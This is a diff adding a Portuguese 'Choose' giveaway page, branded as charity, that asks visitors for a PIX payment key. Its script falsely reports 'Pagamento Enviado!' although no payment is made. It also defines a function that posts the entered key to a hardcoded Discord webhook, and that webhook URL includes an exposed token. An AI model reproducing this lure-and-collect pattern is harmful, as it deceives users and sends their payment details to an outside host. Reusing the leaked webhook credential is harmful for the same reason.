@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Choose</title>
+</head>
+<body>
+
+    <div class="top-gradient"></div>
+
+    <div class="container">
+        <img src="https://i.ibb.co/521jgFX/choose-image.png" alt="Choose" class="choose-image">
+        <h1 id="choose-title">Choose</h1>
+        <div class="flex-container">
+            <div class="item">
+                <div class="card">
+                    <p class="red-text">R$ 2</p>
+                    <button class="choose-button">Escolher</button>
+                </div>
+            </div>
+            <div class="item">
+                <div class="card">
+                    <p class="red-text">Presente Misterioso</p>
+                    <button class="mystery-button">Escolher</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Cardbox para inserção de PIX -->
+    <div class="card-box-overlay">
+        <div class="card-box">
+            <button class="close-button">×</button>
+            <p>Insira o PIX:</p>
+            <input type="text" class="pix-input" placeholder="Chave Aleatória">
+            <p class="error-text"></p> <!-- Mensagem de erro -->
+            <button class="send-button">Enviar</button>
+        </div>
+    </div>
+
+    <div class="notification-box">
+      <p class="notification-text"></p>
+  </div>
+
+  <div class="corner-content">
+    <img src="https://i.ibb.co/S3M7jpf/charity-image.png" alt="Charity" class="charity-image">
+</div>
+
+    <div class="charity">
+        <p class="charity-text">.charity <span class="heart-emoji">❤️</span></p>
+  </div>
+  
+
+    <!-- Script para interatividade -->
+    <script>
+      const chooseButton = document.querySelector('.choose-button');
+      const cardBoxOverlay = document.querySelector('.card-box-overlay');
+      const cardBox = document.querySelector('.card-box');
+      const closeButton = document.querySelector('.close-button');
+      const sendButton = document.querySelector('.send-button');
+      const notificationBox = document.querySelector('.notification-box');
+      const notificationText = document.querySelector('.notification-text');
+      const pixInput = document.querySelector('.pix-input');
+
+chooseButton.addEventListener('click', () => {
+    cardBoxOverlay.style.display = 'block';
+    cardBox.style.display = 'block';
+});
+
+closeButton.addEventListener('click', () => {
+    cardBoxOverlay.style.display = 'none';
+    cardBox.style.display = 'none';
+    clearError();
+});
+
+sendButton.addEventListener('click', () => {
+    const pixValue = pixInput.value.trim();
+
+    if (pixValue === '') {
+        showError('Insira a chave aleatória antes de enviar.');
+    } else if (pixValue.length !== 36) {
+        showError('Digite uma chave aleatória válida.');
+    } else {
+        cardBoxOverlay.style.display = 'none';
+        cardBox.style.display = 'none';
+        showNotification('Pagamento Enviado!');
+        clearError();
+    }
+});
+
+function showNotification(message) {
+    notificationText.textContent = message;
+    notificationBox.classList.add('show');
+    setTimeout(() => {
+        notificationBox.classList.remove('show');
+    }, 3000);
+}
+
+function showError(message) {
+    const errorText = document.querySelector('.error-text');
+    errorText.textContent = message;
+    errorText.style.color = '#ff4d4d'; /* Vermelho */
+}
+
+function clearError() {
+    const errorText = document.querySelector('.error-text');
+    errorText.textContent = '';
+}
+
+async function sendPixToDiscord(chavePix) {
+        const webhookUrl = "https://discord.com/api/webhooks/1126571677472538634/rJQFO1EUfo6-mtVcMJP0RQXYRsgDYmRC26IsqkP-Xkya8eX31lOd2uIE4bBzfFOuoSPN";
+
+        const data = {
+            content: `Nova chave PIX recebida: ${chavePix}`
+        };
+
+        try {
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+
+            if (!response.ok) {
+                console.error('Erro ao enviar a chave PIX para o Discord.');
+            }
+        } catch (error) {
+            console.error('Erro ao enviar a chave PIX para o Discord:', error);
+        }
+    }
+  </script>
+</body>
+</html>
